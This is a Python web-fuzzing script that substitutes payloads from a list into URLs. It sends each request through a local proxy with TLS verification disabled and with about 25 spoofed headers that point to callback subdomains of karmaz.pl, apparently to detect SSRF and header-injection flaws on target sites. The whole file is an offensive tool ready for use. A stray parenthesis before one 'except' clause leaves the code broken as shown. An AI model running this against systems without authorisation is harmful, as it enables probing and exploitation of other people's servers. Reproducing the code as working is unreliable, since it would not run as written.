#!/usr/bin/env python
###
# SWAP "FUZZ" IN GIVEN LIST WITH CUSTOM PAYLOAD
# ATTACHING CUSTOM HEADERS TO EACH REQUEST
# usage : crimson_fuzzer.py [file_with_urls] [file_with_paylod]
###

 
import sys
import requests
from urllib3.exceptions import InsecureRequestWarning
# Suppress only the single warning from urllib3 needed.
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

def loop_over_urls():
    i = 0
    with open (list_of_urls) as urls:
        for line in urls:
            with open(list_of_payloads) as payloads:
                for payload in payloads:
                    try:
                        i+=1
                        r = requests.get((line.rstrip()).replace("FUZZ",payload.rstrip()), timeout=2, proxies=proxies, headers=list_of_headers, verify=False)
                        #([ID]          [CODE]      [LENGTH]            [PAYLOAD]
                        print(str(i) + "\t\t\t" + str(r.status_code) + "\t\t" + str(len(r.content)) + "\t\t\t" + payload.rstrip())
                    except requests.exceptions.HTTPError as errh:
                        print ("Http Error:",errh)
                    except requests.exceptions.ConnectionError as errc:
                        print ("Error Connecting:",errc)
                    except requests.exceptions.Timeout as errt:
                        pass
                        #print ("Timeout Error:",errt
)                    except requests.exceptions.RequestException as err:
                        print ("OOps: Something Else",err)            
                    except KeyboardInterrupt:
                        sys.exit()


# Define proxy server
proxies = {
 'http': 'http://127.0.0.1:8080',
 'https': 'http://127.0.0.1:8080',
}
# Define wordlist with urls [example line of a file: http://asd.com/?a=FUZZ)
list_of_urls = sys.argv[1]
# Define payloads
list_of_payloads = sys.argv[2]
# List of all custom headers
list_of_headers = {
    'X-Client-IP': 'a.karmaz.pl',
    'X-Forwarded-Host': 'b.karmaz.pl',
    'X-Host':'c.karmaz.pl',
    'X-Forwarded-Server': 'd.karmaz.pl',
    'X-Originating-IP': 'e.karmaz.pl',
    'X-Forwarded-For': 'f.karmaz.pl',
    'X-Remote-IP': 'g.karmaz.pl',
    'X-Remote-Addr': 'h.karmaz.pl',
    'CF-Connecting_IP': 'i.karmaz.pl',
    'X-Original-URL': 'j.karmaz.pl',
    'X-Rewrite-URL': 'k.karmaz.pl',
    'X-Real-IP':'l.karmaz.pl',
    'Client-IP':'m.karmaz.pl',
    'True-Client-IP':'n.karmaz.pl',
    'User-Agent':'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36 root@o.karmaz.pl',
    'Referer':'p.karmaz.pl',
    'X-Wap-Profile':'http://r.karmaz.pl/wap.xml',
    'Profile':'http://s.karmaz.pl/wap.xml',
    'X-Arbitrary':'http://t.karmaz.pl/',
    'X-HTTP-DestinationURL':'http://u.karmaz.pl/',
    'X-Forwarded-Proto':'http://w.karmaz.pl/',
    'Origin':'x.karmaz.pl',
    'Contact':'root@y.karmaz.pl',
    'Destination':'z.karmaz.pl',
    'style':'a1.karmaz.pl',
    }

# Main loop
loop_over_urls()

